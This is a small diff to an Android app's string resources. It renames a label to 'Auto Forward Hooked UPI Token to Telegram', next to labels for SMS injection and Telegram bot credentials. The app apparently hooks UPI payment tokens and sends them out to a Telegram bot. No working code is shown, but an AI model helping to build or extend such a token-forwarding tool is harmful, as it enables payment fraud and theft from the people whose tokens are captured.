@@ -73,7 +73,7 @@
     <string name="inject_local_sms">Inject Local SMS</string>
     <string name="telegram_bot_token">Telegram Bot Token:</string>
     <string name="telegram_chat_id">Telegram Chat ID:</string>
-    <string name="auto_forward_token">Forward Hooked UPI Token to Telegram</string>
+    <string name="auto_forward_token">Auto Forward Hooked UPI Token to Telegram</string>
     <string name="test_telegram">Test Telegram Forward</string>
     <string name="telegram_test_sent">Test message Telegram par bheja gaya</string>
     <string name="telegram_test_failed">Telegram forward fail — token/chat ID check karein</string>
